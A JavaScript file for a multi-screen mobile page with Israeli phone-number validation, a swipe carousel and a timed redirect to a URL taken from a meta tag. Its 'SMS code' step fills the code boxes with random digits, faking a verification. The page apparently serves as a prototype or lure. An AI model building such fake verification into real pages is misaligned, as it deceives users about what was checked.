/* scripts.js — robust, DOM-ready, exposes handlers to window for inline onclick */
(function () {
  'use strict';

  function init() {
    try { localStorage.setItem('savedUrl', window.location.href); } catch (e) { /* ignore */ }
    console.log('scripts.js initialized');

    const screens = document.querySelectorAll('.screen');

    // Exposed functions (for inline onclicks)
    function navigateTo(hash) {
      location.hash = hash;
    }
    window.navigateTo = navigateTo;

    function validatePhone() {
      const phoneEl = document.getElementById('phoneInput');
      const pattern = /^05[0-9]{8}$/;
      if (!phoneEl) {
        alert('Phone input missing on page.');
        return;
      }
      if (pattern.test(phoneEl.value)) {
        navigateTo('#confirm');
      } else {
        alert('Please enter a valid Israeli phone number (e.g. 0501234567).');
      }
    }
    window.validatePhone = validatePhone;

    // Screen rendering
    function renderScreen() {
      try {
        screens.forEach(s => s.classList.remove('active'));
        const stage = (location.hash.replace('#', '') || 'stage1');
        const activeScreen = document.getElementById(stage);
        if (activeScreen) activeScreen.classList.add('active');

        if (stage === 'confirm') {
          simulateSMSCode();
        } else if (stage === 'final') {
          // read redirect URL from <meta name="redirect-url"> in the head
          var meta = document.querySelector('meta[name="redirect-url"]');
          var redirectUrl = meta ? meta.content : null;
          if (redirectUrl) {
            setTimeout(function () {
              location.href = redirectUrl;
            }, 1000);
          }
        }
      } catch (err) {
        console.error('renderScreen error', err);
      }
    }

    window.addEventListener('hashchange', renderScreen);
    window.addEventListener('load', renderScreen);
    renderScreen(); // initial render (in case hash already set)

    // Carousel setup (guarded)
    const track = document.getElementById('carouselTrack');
    const dots = document.querySelectorAll('.dot');
    let currentIndex = 0;
    let startX = 0;

    function updateCarousel() {
      if (track) track.style.transform = `translateX(-${currentIndex * 100}%)`;
      if (dots) dots.forEach((d, i) => d.classList.toggle('active', i === currentIndex));
    }

    function touchStart(e) {
      startX = e.touches ? e.touches[0].clientX : e.clientX;
    }
    function touchMove(e) {
      if (!startX) return;
      const x = e.touches ? e.touches[0].clientX : e.clientX;
      const diff = startX - x;
      if (diff > 50 && currentIndex < dots.length - 1) {
        currentIndex++;
        updateCarousel();
        startX = 0;
      } else if (diff < -50 && currentIndex > 0) {
        currentIndex--;
        updateCarousel();
        startX = 0;
      }
    }
    function touchEnd() { startX = 0; }

    if (track) {
      track.addEventListener('touchstart', touchStart);
      track.addEventListener('mousedown', touchStart);
      track.addEventListener('touchmove', touchMove);
      track.addEventListener('mousemove', e => { if (e.buttons) touchMove(e); });
      track.addEventListener('touchend', touchEnd);
      track.addEventListener('mouseup', touchEnd);
    }

    if (dots) {
      dots.forEach((dot, i) => dot.addEventListener('click', () => {
        currentIndex = i;
        updateCarousel();
      }));
    }

    // SMS code simulation
    let smsTimer = null;
    function simulateSMSCode() {
      if (smsTimer) clearTimeout(smsTimer);
      const inputs = document.querySelectorAll('.digit');
      const confirmBtn = document.getElementById('confirmNextBtn');
      if (confirmBtn) confirmBtn.disabled = true;
      inputs.forEach(input => {
        input.value = '';
        input.classList.remove('fade-in');
      });

      smsTimer = setTimeout(() => {
        inputs.forEach((input, i) => {
          setTimeout(() => {
            input.value = Math.floor(Math.random() * 10);
            input.classList.add('fade-in');
          }, i * 100);
        });
        if (confirmBtn) confirmBtn.disabled = false;
      }, 2000);
    }

    updateCarousel();
  } // end init()

  // Run init after DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
